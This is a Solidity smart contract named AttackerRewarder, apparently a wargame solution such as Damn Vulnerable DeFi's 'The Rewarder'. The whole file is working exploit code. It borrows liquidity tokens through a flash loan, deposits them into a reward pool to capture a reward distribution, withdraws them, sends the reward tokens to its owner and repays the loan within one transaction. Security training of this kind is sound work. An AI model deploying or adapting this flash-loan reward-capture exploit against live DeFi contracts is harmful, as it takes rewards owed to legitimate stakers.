//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}
interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external; 
    function distributeRewards() external returns (uint256 rewards);
    
}

contract AttackerRewarder{
    IFlashLoanerPool immutable pool;
    IERC20 immutable rewardtoken;
    IERC20 immutable liquidtoken;
    IRewarderPool immutable rewardpool;
    address immutable owner;
    constructor(address _pool, address _rewardtoken,address _liquidtoken, address _rewardpool){
        owner = msg.sender;
        pool = IFlashLoanerPool(_pool);
        rewardtoken = IERC20(_rewardtoken);
        liquidtoken = IERC20(_liquidtoken);
        rewardpool = IRewarderPool(_rewardpool);
    }
    function attack( uint256 amount) external{
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        liquidtoken.approve(address(rewardpool),amount);
        rewardpool.deposit(amount);
        // rewardpool.distributeRewards();
        rewardpool.withdraw(amount);
        uint256 value = rewardtoken.balanceOf(address(this));
        rewardtoken.transfer(owner,value);
        liquidtoken.transfer(address(pool),amount);
    }

}